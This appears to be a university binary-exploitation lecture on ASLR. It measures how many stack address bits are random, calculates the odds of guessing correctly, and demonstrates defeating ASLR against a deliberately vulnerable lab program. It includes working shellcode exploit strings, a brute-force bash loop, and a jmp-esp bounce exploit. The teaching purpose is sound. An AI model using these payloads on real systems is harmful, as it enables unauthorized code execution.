# Unit 5: Defensive Techniques

# ASLR: Address Space Layout Randomization

So far this semester we've turning off a bunch of security features that
have made a lot of our exploits a lot easier. This lesson, we are going
to turn one of those: Address Space Layout Randomization, or ASLR.

The purpose of ASLR is to increase the difficulty of performing buffer
overflow by randomizing the mapping of the memory at processes load
time. What this means practically is that if you have are performing an
exploit like so

``` example
                                          .-----------.
                                          |           |
                                          |           v
./vulnerable 5 <--------padding-----><return-address><shell code>
```

where you are overwriting the return address with another value on the
stack, the address of your shell code will move around. Clearly, this
will make things more difficult, but we've got tools to get around this.

In today's lesson we are going to first see how ASLR is ineffective at
preventing our attacks for the simple reason that probabilities are on
are side --- the so called birthday paradox. It also turns out that in
some situations, we don't actually have to guess anything. We can
leverage the non-randomized parts of the program to do our dirty work
for us.

# How random is random really?

The first thing to do is to investigate how ASLR works. To do that, we
need to first understand a bit how memory is *mapped* for a process.
Every process has a memory map, managed by the kernel, which describes
what parts of the memory address space are accessible. We can actually
look at the maps of a process use the `/proc` file system.

To do so, we'll consider a small program that just busy waits, which we
can run in the background, and then we can look at its maps.

``` example
user@si485H-base:demo$ ./busy_wait &
[4] 7984
[3]   Terminated              ./busy_wait
user@si485H-base:demo$ cat /proc/7984/maps
08048000-08049000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
08049000-0804a000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
0804a000-0804b000 rwxp 00001000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
b7e19000-b7e1a000 rwxp 00000000 00:00 0 
b7e1a000-b7fc2000 r-xp 00000000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc2000-b7fc4000 r-xp 001a8000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc4000-b7fc5000 rwxp 001aa000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc5000-b7fc8000 rwxp 00000000 00:00 0 
b7fdb000-b7fdd000 rwxp 00000000 00:00 0 
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
b7ffe000-b7fff000 r-xp 0001f000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
b7fff000-b8000000 rwxp 00020000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
```

You notice some maps are familiar, such as the stack, and also some
libraries, like `libc`. Additionally, you'll see the program code
itself, e.g., the binary file, is also mapped into memory. This is the
entire address space layout as we've seen it so far, and if we were to
try and access out of bounds of this area, we would get a segmentation
fault.

Also, the memory space is not randomized. We can see that is the case if
we were to run this program again and look at the maps:

``` example
user@si485H-base:demo$ killall busy_wait
user@si485H-base:demo$ ./busy_wait &
[5] 7988
[4]   Terminated              ./busy_wait
user@si485H-base:demo$ cat /proc/7988/maps
08048000-08049000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
08049000-0804a000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
0804a000-0804b000 rwxp 00001000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
b7e19000-b7e1a000 rwxp 00000000 00:00 0 
b7e1a000-b7fc2000 r-xp 00000000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc2000-b7fc4000 r-xp 001a8000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc4000-b7fc5000 rwxp 001aa000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7fc5000-b7fc8000 rwxp 00000000 00:00 0 
b7fdb000-b7fdd000 rwxp 00000000 00:00 0 
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
b7ffe000-b7fff000 r-xp 0001f000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
b7fff000-b8000000 rwxp 00020000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
```

Same mappings. Now, let's turn on address space randomization.

``` example
user@si485H-base:demo$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space 
2
```

If we were to look at the maps again, this time the picture is a bit
different:

``` example
user@si485H-base:demo$ ./busy_wait &
[2] 7999
user@si485H-base:demo$ cat /proc/7999/maps
08048000-08049000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
08049000-0804a000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
0804a000-0804b000 rwxp 00001000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
b75cf000-b75d0000 rwxp 00000000 00:00 0 
b75d0000-b7778000 r-xp 00000000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b7778000-b777a000 r-xp 001a8000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b777a000-b777b000 rwxp 001aa000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
b777b000-b777e000 rwxp 00000000 00:00 0 
b7791000-b7793000 rwxp 00000000 00:00 0 
b7793000-b7794000 r-xp 00000000 00:00 0          [vdso]
b7794000-b77b4000 r-xp 00000000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
b77b4000-b77b5000 r-xp 0001f000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
b77b5000-b77b6000 rwxp 00020000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
bf8fb000-bf91c000 rwxp 00000000 00:00 0          [stack]
```

In particular, as we care most about the stack, the stack address has
changed significantly. Interesting, the address of the text segment has
not (which will be important later). If we were to run this a bunch of
times, we'd start to see that every time we run the program, we get
different values of the stack. Here's a script to do that:

``` bash
  #!/bin/bash
  for i in `seq 1 1 25` #loop 25 times
   do 
      ./busy_wait & #run busywait
      pid=$! #get its pid
      cat /proc/$pid/maps | grep stack #report its mapping for the stack
      kill -9 $pid
  done
```

And the output:

``` example
user@si485H-base:demo$ ./rand_stack.sh 2>/dev/null
bf8d5000-bf8f6000 rwxp 00000000 00:00 0          [stack]
bfa39000-bfa5a000 rwxp 00000000 00:00 0          [stack]
bfa02000-bfa23000 rwxp 00000000 00:00 0          [stack]
bfe62000-bfe83000 rwxp 00000000 00:00 0          [stack]
bf99d000-bf9be000 rwxp 00000000 00:00 0          [stack]
bf9f7000-bfa18000 rwxp 00000000 00:00 0          [stack]
bfbd9000-bfbfa000 rwxp 00000000 00:00 0          [stack]
bfbdb000-bfbfc000 rwxp 00000000 00:00 0          [stack]
bfc18000-bfc39000 rwxp 00000000 00:00 0          [stack]
bfaaa000-bfacb000 rwxp 00000000 00:00 0          [stack]
bfd70000-bfd91000 rwxp 00000000 00:00 0          [stack]
bfe83000-bfea4000 rwxp 00000000 00:00 0          [stack]
bf96f000-bf990000 rwxp 00000000 00:00 0          [stack]
bfc28000-bfc49000 rwxp 00000000 00:00 0          [stack]
bfae4000-bfb05000 rwxp 00000000 00:00 0          [stack]
bfd1a000-bfd3b000 rwxp 00000000 00:00 0          [stack]
bfd38000-bfd59000 rwxp 00000000 00:00 0          [stack]
bfce7000-bfd08000 rwxp 00000000 00:00 0          [stack]
bff97000-bffb8000 rwxp 00000000 00:00 0          [stack]
bfb1e000-bfb3f000 rwxp 00000000 00:00 0          [stack]
bfdc8000-bfde9000 rwxp 00000000 00:00 0          [stack]
bfec7000-bfee8000 rwxp 00000000 00:00 0          [stack]
bfd5d000-bfd7e000 rwxp 00000000 00:00 0          [stack]
bfd79000-bfd9a000 rwxp 00000000 00:00 0          [stack]
bfb1e000-bfb3f000 rwxp 00000000 00:00 0          [stack]
```

## Bits of Entropy

You may notice from above that while there is randomness in the
placement of the stack, there is not a *huge* amount of randomness. The
question at hand is how much randomness is really there? Or, more
generally, how many bits in the address are really random?

To do that, let's look at a more simple program:

``` c
#include <stdio.h>
#include <stdlib.h>

int main(){

  int a =10;

  printf("%p\n",&a);

}
```

The program just prints the address of a stack defined variable. If we
were to run this program once or twice we can see that we are getting
different values each time:

``` example
user@si485H-base:demo$ ./rand_sample 
0xbffe6f4c
user@si485H-base:demo$ ./rand_sample 
0xbf8e514c
user@si485H-base:demo$ ./rand_sample 
0xbffcfbbc
user@si485H-base:demo$ ./rand_sample 
0xbfb34d6c
```

Now, let's take this a bit further. Here's a python program that will
read in these values and determine which of the bits are actually
changing across runs:

``` python
  #!/usr/bin/python

  import sys

  def to_bin(v):
      r = ""
      for i in range(32):
          r += str( v & 0x1)
          v >>= 1

      return "".join(reversed(r))

  last = None
  changed = list(to_bin(0xFFFFFFFF))
  addr = 0xFFFFFFFF
  for l in sys.stdin:
      a = int(l.strip(),16)

      addr &= a


      if last == None:
          last = list(to_bin(a))
      else:
          cur = list(to_bin(a))
          for i in range(32):
              if last[i] != cur[i]:
                  changed[i] = "0"




   print "Consitent: ", to_bin(addr), hex(addr)
   print "  Changed: ", "".join(changed), 32-sum(map(int,changed))
```

Bringing these program together:

``` example
user@si485H-base:demo$ for i in `seq 1 1 100`; do ./rand_sample ; done | python random_bits.py 
Consitent:  10111111100000000000000000001100 0xbf80000c
  Changed:  11111111100000000000000000001111 19
```

We see that the prefix 0xbf8 and the suffix 0xc persist across runs. In
total, only 19 of the 32 bits is random. This is a big difference.
Consider that if there was truly 32 bits of randomness, that means there
could be 2<sup>32</sup> possible values to guess, or roughly 4 billion.

On the other hand, 2<sup>19</sup> is a more tractable number. That's
only roughly half a million, which on face value may seam like a lot,
but it is significantly smaller than 4 billion. More so, we only have to
be right once to exploit the program, and the probability that we are
right increases exponentially with each guess.

## Probability of Success

The next question is, given that there are only 19 bits of randomness to
play with here, what is our probability of correctly guessing the right
return address.

With one guess, that would be 2<sup>(-19)</sup> or 1/524288, which
doesn't seem that good, but we're talking about computers here, so we
guess a lot of times. To see how this probability changes in the number
of guesses we make, we can treat this like an expectation of a geometric
probability calculation.

The idea is that if we were to make `n` guesses, what is probability
that we get the right address at least once. At least once calculations
are a bit tough to do, generally, but the inverse probability is easier.
Instead, lets consider the probability of never getting the address
right, and the inverse of that probability would be the same as getting
it right *at least* once.

The probability of not guessing correctly is calculated as one minus the
probability of guessing correctly (or \$\`q\`\$):

``` math
q = 1 - \frac{1}{2^{19}}
```

So if we were to consider the probility in \$\`n\`\$ attempts of *not*
getting it right, that would be

``` math
1 - q^{\ n}
```

Another way to read this is that after \$\`n\`\$ independent events,
each with a probability of not guessing correctly, the probability of
getting at least one right, is the inverse of never getting it right.

Here is a small python program that does this calculation for us:

``` python
#!/usr/bin/python

import sys

if __name__ == "__main__":

    p = float(sys.argv[1])
    n = int(sys.argv[2])

    q = 1-p
    for i in range(n+1):
        prob = 1 - q**(i+1)
        print i, prob
```

Running it for 2<sup>19</sup>, we can start to see the challenge:

``` example
user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 10
0 1.90734863281e-06
1 3.81469362765e-06
2 5.7220349845e-06
3 7.62937270338e-06
4 9.53670678439e-06
5 1.14440372273e-05
6 1.33513640324e-05
7 1.52586871995e-05
8 1.71660067286e-05
9 1.907332262e-05
10 2.09806348732e-05
```

Our odds are pretty bad, but after a few thousands attempts:

``` example
user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 1000 | tail 
991 0.0018903027712
992 0.00189220651437
993 0.00189411025391
994 0.00189601398981
995 0.00189791772208
996 0.00189982145073
997 0.00190172517574
998 0.00190362889712
999 0.00190553261487
1000 0.00190743632898

user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 10000 | tail 
9991 0.0188777855858
9992 0.0188796569279
9993 0.0188815282665
9994 0.0188833996014
9995 0.0188852709328
9996 0.0188871422607
9997 0.018889013585
9998 0.0188908849057
9999 0.0188927562228
10000 0.0188946275363

user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 100000 | tail 
99991 0.173635885806
99992 0.173637461971
99993 0.173639038132
99994 0.173640614291
99995 0.173642190446
99996 0.173643766598
99997 0.173645342748
99998 0.173646918894
99999 0.173648495038
100000 0.173650071178
```

Things are starting to look a bit better, but not that great.
Fortunately, we can do a lot better than this with some careful
nop-sledding.

## On ASLR and NOP sleds

In the calculations before we were only considering the situation where
we have to get it exactly right, like in the exploit below:

``` example
                                          .-----------.
                                          |           |
                                          |           v
./vulnerable 5 <--------padding-----><return-address><shell code>
```

But, we aren't considering the NOP sled, what if we did the following
with the exploit:

``` example
                                          .---------------.
                                          |               |
                                          |               v
./vulnerable 5 <--------padding-----><return-address><'\x90' x 65535 > <shell code>
```

If our nop sled is large enough, we are essentially taking away some
potential randomness because we are can jump anywhwere in the nop sled.
For example, consider if we want to overwrite the return address with
0xbfa20000 and we have a nop sled of length 0xffff. Then we can jump
anywhere between 0xbfa20000 and 0xbfa2fffff and we would hit the nop
sled and reach our shell code. How many bits of randomness remain now?

From before, we saw that the first 13 bits were fixed with the first 9
and the last 4. Now we are saying that whatever the last 16 bits in the
address also doesn't matter as well, overlapping with the previously
fixed last 4. That leaves *only* 32-16-9 = 7 bits of randomness to
contend with, and that ain't much, just 128 possibilities! The
probabilities really start to work in our favor now:

``` example
user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**7'` 10 | tail
1 0.0155639648438
2 0.0232548713684
3 0.0308856926858
4 0.0384568982117
5 0.0459689536945
6 0.0534223212437
7 0.060817459359
8 0.0681548229578
9 0.0754348634034
10 0.0826580285331
user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**7'` 100 | tail
91 0.514012476108
92 0.517809253638
93 0.521576368844
94 0.525314053462
95 0.52902253742
96 0.532702048846
97 0.536352814089
98 0.539975057729
99 0.543569002591
100 0.547134869758
user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**7'` 1000 | tail
991 0.999582168385
992 0.999585432694
993 0.999588671501
994 0.999591885005
995 0.999595073404
996 0.999598236893
997 0.999601375667
998 0.99960448992
999 0.999607579842
1000 0.999610645625
```

After a hundred guesses, we have more than 50% probability of getting it
right at least once! So let's make that happen.

# Brute Forcing ASLR

Now that we see how *easy* it is to guess the right place to jump, let's
see what it takes to actually brute force this. The first thing we need
to determine is a good place to set up our exploit. From what we've
seen, the addresses on the stack can range anywhere between 0xbf80000
and 0xbfffffff, so let's split the hairs (12-8)/2=2 and 2+8 is 0xa. So,
let's try and jump to an address in the range 0xbfa00000. We can't send
null bytes into our code, so we can use 0xbfbffff as our overwritten
return address, and thus any address in the range 0xbfbfffff -\>
0xbfa0fffe will work. For the function we are going to exploit, we'll
use the vulnerable program from earlier lessons, shown below:

``` c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void bad(){
  printf("You've been naughty!\n");
}

void good(){
  printf("Go Navy!\n");
}

void vuln(int n, char * str){

  int i = 0;  
  char buf[32];


  strcpy(buf,str);

  while( i < n ){
    printf("%d %s\n",i++, buf);
  }

}

int main(int argc, char *argv[]){

  vuln(atoi(argv[1]), argv[2]);

  return 0;

}
```

And here is the exploit string we will use:

``` example
./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
```

The embedded shell code is our 21 byte *smallest shell code*, and we
will put in 0xffff nop's to increase our chances. Here's a little shell
script to perform the brute force:

``` bash
  #!/bin/bash

  let i=1
  while true
  do 
      echo $i $(dmesg | tail -1 | grep -o "sp [^ ]* ")  #count plus last failed stack pointer
      echo
      ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
      let i=i+1
  done
```

The script will print out the number of attempts, and also the address
of the stack pointer on the last failed attempt. And off it goes ...

``` example
./brute_force.sh 
1 sp bfe6fff0

./brute_force.sh: line 11: 16261 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
2 sp bfcf8760

./brute_force.sh: line 11: 16269 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
3 sp bf809a40

./brute_force.sh: line 11: 16277 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
4 sp bfcbc9e0

./brute_force.sh: line 11: 16285 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
5 sp bfd794d0

./brute_force.sh: line 11: 16293 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
6 sp bfaa49c0

./brute_force.sh: line 11: 16301 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
7 sp bfac9870

./brute_force.sh: line 11: 16309 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
8 sp bfa30420

./brute_force.sh: line 11: 16317 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
9 sp bfd87030

./brute_force.sh: line 11: 16325 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
10 sp bfa4cc00

./brute_force.sh: line 11: 16333 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
11 sp bfddb220

./brute_force.sh: line 11: 16341 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
12 sp bfddb220

./brute_force.sh: line 11: 16349 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
13 sp bfddb220

./brute_force.sh: line 11: 16357 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
14 sp bfddb220

./brute_force.sh: line 11: 16365 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
15 sp bfddb220

./brute_force.sh: line 11: 16373 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
16 sp bfddb220

./brute_force.sh: line 11: 16382 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
17 sp bfddb220

./brute_force.sh: line 11: 16390 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
18 sp bfddb220

./brute_force.sh: line 11: 16398 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
19 sp bfddb220

./brute_force.sh: line 11: 16406 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
./brute_force.sh: line 10: usleep: command not found
20 sp bfddb220

$ 
```

This time it took 20 attempts to get it ... the next time, maybe more,
maybe less. But the odds are ever in our favor :)

# Bouncing to Defeat ASLR

One thing we learned by brute forcing ASLR is that randomness may not be
as random as we want it to be. However, things get worse when something
is completely un-random. It doesn't help that the stack is random if
some other part of the code is not random. If that non-random region
happened to hold some instruction that would be useful, and it was
always in that same spot, then we could use it as part of our exploit.

# Call/Jmp esp bounce

What are we looking for exactly? Well there are two instructions that
are particularly useful: `jmp esp` and `call esp`. These two
instructions are super useful due to what happens right before the
return address. Consider the `leave` and `ret` commands, which are
equivalent to the following:

``` example
  leave --> mov esp,ebp
            pop ebp

  ret   --> pop eip
```

The leave command will deallocate the stack frame and reset `ebp` to the
saved base pointer. Return will then pop the return address off the
stack and set it to the instruction pointer. The question, what does the
stack look like when that procedure finishes, and what is esp
referencing. If we look at situation where we are using an exploit like
so:

``` example
                                          .-----------.
                                          |           |
                                          |           v
./vulnerable 5 <--------padding-----><return-address><shell code>
```

Our stack would like this as we moved through the procedures

``` example
                leave->mov esp,ebp       ret->pop eip
                       pop ebp
```

:

``` example
                       ebp->|   ???   |  ebp->|   ???   |
      .---------.           |---------|       |---------|
      | s  c    |           | s  c    |       | s  c    |
      |  h  o   |           |  h  o   |       |  h  o   |
      |   e  d  |           |   e  d  |       |   e  d  |
      |    l  e |           |    l  e |       |    l  e |
      |     l   |           |     l   | esp-> |     l   |
      |---------|           |---------|       '---------'
      | ret. ad.|      esp->| ret. ad.|
      |---------|           '---------'   
ebp-> |   sbp   |  
      |---------|
      |         |     
      :         :
      .         . 
esp-> |         |
      '---------'
```

And looky there, `esp` is pointing right at our shell code. So, if knew
the location of a `jmp esp` or `call esp` instruction, then we can write
that address as the return address and that would then execute our shell
code. This is called *bouncing*.

## Finding a bounce point

To start, we need to what bytes constitute a `jmp esp` or a `call esp`.

``` example
user@si485H-base:demo$ objdump -d -M intel jmpcall_esp

jmpcall_esp:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:   ff e4                   jmp    esp
 8048062:   ff d4                   call   esp
```

So, in our code, we are looking for `\xff\xe4` or `\xff\d4`. To see how
this works, I've modified the vulnerable program we've been working with
as follows:

``` c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void jmpesp_embedding(){
  asm("jmp *%esp");//add a jmp esp instruction here to find
}

void bad(){
  printf("You've been naughty!\n");
}

void good(){
  printf("Go Navy!\n");
}

void vuln(int n, char * str){

  int i = 0;  
  char buf[32];


  strcpy(buf,str);

  while( i < n ){
    printf("%d %s\n",i++, buf);
  }

}

int main(int argc, char *argv[]){

  vuln(atoi(argv[1]), argv[2]);

  return 0;

}
```

The function `jmpesp_embedding` uses C's inline assembly embedding, the
`asm()` function to put a `jmp esp` instruction into the C code at a
consistent place. In particular, it will be in the `text` segment, which
is not randomized. The reason is somewhat obvious when you think about
it, there are a lot of hard jmps and control flow that requires knowing
the addresses of other functions. This stuff can't be changed willy
nilly, so it can't be randomized like the stack, where everything is
relative to the stack and base pointers.

To learn the address of our bounce point, we can look at `objdump`.

``` example
080484ad <jmpesp_embedding>:
 80484ad:   55                      push   ebp
 80484ae:   89 e5                   mov    ebp,esp
 80484b0:   ff e4                   jmp    esp
 80484b2:   5d                      pop    ebp
 80484b3:   c3                      ret    
```

At address 0x08048b0, we have a `jmp esp`, and now to use that as our
overwrite for the return address. Below, I use the smallest shell code
(21-byte) code as before:

``` example
user@si485H-base:demo$ ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xb0\x84\x04\x08' + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
$ cat /proc/sys/kernel/randomize_va_space
2
$ 
```

And, on the first try, BAM!, and look, no NOP sled. As you can see, this
is with address space randomization. This just got easy ... sort of.

## Bouncing off Linux Gate (Linux 2.6.X)

People have known about this vulnerability for awhile, so they try hard
get rid of bounce points, but that was not always the case. Let's take a
trip down memory lane to 2006 when the Linux 2.6.X kernel was kind.
Ubuntu 6.06 was released (so called Dapper Drake), and for reference, we
are now up to 14.04.

In the Linux 2.6.X kernels, there was a problem with address space
randomization and the loading of some shared libraries. The problem,
there map locations was not random. We can investigate this more by
taking a trip down memory lane ... I've got a Ubuntu 6.06 VM running.

We can run the same tests to check out the randomness as we did in the
last lesson:

``` example
user@ubuntu-6-06:~/si485h-class-demos/class/16$ uname -a
Linux ubuntu-6-06 2.6.15-26-386 #1 PREEMPT Thu Aug 3 02:52:00 UTC 2006 i686 GNU/Linux

user@ubuntu-6-06:~/si485h-class-demos/class/16$ for i in `seq 1 1 100`; do ./rand_sample ; done | python random_bits.py 
Consitent:  10111111100000000000000000000100 0xBF800004L
  Changed:  11111111100000000000000000001111 19
```

And we do see that the yes, in fact there is randomization going on, but
it is not quite as it seems. Let's look what happens when we look at the
maps:

``` example
user@ubuntu-6-06:~/si485h-class-demos/class/16$ ./busy_wait &
[2] 10252
user@ubuntu-6-06:~/si485h-class-demos/class/16$ cat /proc/10252/maps 
08048000-08049000 r-xp 00000000 08:01 614242     /home/user/si485h-class-demos/class/16/busy_wait
08049000-0804a000 rwxp 00000000 08:01 614242     /home/user/si485h-class-demos/class/16/busy_wait
b7e36000-b7e37000 rwxp b7e36000 00:00 0 
b7e37000-b7f5c000 r-xp 00000000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
b7f5c000-b7f61000 r-xp 00125000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
b7f61000-b7f64000 rwxp 0012a000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
b7f64000-b7f66000 rwxp b7f64000 00:00 0 
b7f70000-b7f72000 rwxp b7f70000 00:00 0 
b7f72000-b7f87000 r-xp 00000000 08:01 566182     /lib/ld-2.3.6.so
b7f87000-b7f89000 rwxp 00014000 08:01 566182     /lib/ld-2.3.6.so
